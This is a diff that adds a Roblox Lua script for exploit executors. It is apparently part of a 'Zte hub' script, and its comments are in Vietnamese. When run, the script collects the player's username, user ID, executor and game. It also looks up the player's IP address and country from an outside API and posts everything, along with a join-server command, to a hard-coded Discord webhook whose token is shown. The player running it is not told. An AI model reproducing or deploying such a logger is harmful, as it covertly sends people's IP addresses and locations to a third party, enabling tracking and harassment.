@@ -1,1 +1,157 @@
+-- ===================================================================
+-- Roblox Lua LocalScript: Gửi thông tin player + Country + Game Name lên Discord Webhook
+-- Yêu cầu executor phải cho phép HTTP Request (Synapse X, Krnl, v.v.)
+-- Trường hợp không gọi được API, country luôn là "Unknown"
+-- ===================================================================
+
+local Http       = game:GetService("HttpService")
+local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local executor   = identifyexecutor() or "idk"
+
+--========================================================================
+-- Hàm lấy Country + IP từ https://api.myip.com/
+-- Nếu lỗi (executor không cho phép, API bị chặn hoặc sai format), trả về "Unknown"
+--========================================================================
+local function getIPInfo()
+    local success, response = pcall(function()
+        -- Lưu ý: phải gọi đúng https://api.myip.com/
+        return Http:GetAsync("https://api.myip.com/")
+    end)
+
+    if not success then
+        print("DEBUG | getIPInfo() => HTTP request failed")
+        return "Unknown", "Unknown"
+    end
+
+    -- In ra raw JSON để debug nếu cần
+    print("DEBUG | getIPInfo() response JSON:\n" .. response)
+
+    local decoded, err = nil, nil
+    local ok
+    ok, decoded = pcall(function()
+        return Http:JSONDecode(response)
+    end)
+
+    if not ok or type(decoded) ~= "table" then
+        print("DEBUG | JSONDecode failed or result not table")
+        return "Unknown", "Unknown"
+    end
+
+    -- Kiểm tra chắc chắn có hai trường country và ip
+    if type(decoded.country) == "string" and type(decoded.ip) == "string" then
+        print("DEBUG | API returned -> country: " .. decoded.country .. ", ip: " .. decoded.ip)
+        return decoded.country, decoded.ip
+    else
+        print("DEBUG | API JSON thiếu trường country hoặc ip")
+        return "Unknown", "Unknown"
+    end
+end
+
+--========================================================================
+-- Hàm xây dựng payload và trả về table để syn.request/requestFunction sử dụng
+--========================================================================
+local function buildPayload()
+    -- Thông tin player
+    local player      = game.Players.LocalPlayer
+    local displayName = player and player.DisplayName or "Display name not available"
+    local userName    = player and player.Name or "Unknown"
+    local playerId    = player and player.UserId or 0
+
+    -- Tên game hiện tại
+    local gameName = tostring(game.Name or "Unknown Game")
+
+    -- PlaceId + JobId để build join script
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
+                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+
+    -- Lấy Country + IP từ API
+    local country, ip = getIPInfo()
+    -- Debug lại một lần nữa
+    print("DEBUG | buildPayload() -> country:", country, " | ip:", ip)
+    print("DEBUG | buildPayload() -> gameName:", gameName)
+
+    -- Xây payload cho Discord webhook
+    local payload = {
+        content = "**Thanks for using the script!**",
+        embeds  = {
+            {
+                author = {
+                    name = "Zte hub Server"
+                },
+                title = userName .. " | " .. displayName,
+                type  = "rich",
+                color = tonumber(0x00FF00),  -- Màu xanh lá
+                thumbnail = {
+                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
+                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
+                },
+                fields = {
+                    {
+                        name   = "Executor:",
+                        value  = executor,
+                        inline = true
+                    },
+                    {
+                        name   = "Country:",
+                        value  = country,
+                        inline = true
+                    },
+                    {
+                        name   = "IP Address:",
+                        value  = ip,
+                        inline = true
+                    },
+                    {
+                        name   = "Game Name:",
+                        value  = gameName,
+                        inline = false  -- Game Name để trên dòng riêng cho rõ ràng
+                    },
+                },
+            },
+            {
+                title       = "Join Server Script",
+                description = "```lua\n" .. joinScript .. "\n```",
+                color       = tonumber(0x00FF00),
+            }
+        }
+    }
+
+    -- Trả về table request cho syn.request hoặc http_request
+    return {
+        Url     = WebhookUrl,
+        Method  = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body    = Http:JSONEncode(payload)
+    }
+end
+
+--========================================================================
+-- Gửi HTTP Request qua Synapse hoặc qua hàm request phổ biến
+--========================================================================
+local function sendWebhook()
+    local requestFunc
+
+    if syn and syn.request then
+        requestFunc = syn.request
+    else
+        requestFunc = http_request or request or HttpPost or (syn and syn.request)
+    end
+
+    if not requestFunc then
+        warn("Không tìm thấy hàm request phù hợp để gửi HTTP request")
+        return
+    end
+
+    -- Gọi buildPayload() để lấy table request và thực thi
+    requestFunc(buildPayload())
+end
+
+--==================================================================
+-- MAIN EXECUTION: Chạy sendWebhook()
+--==================================================================
+sendWebhook()
 
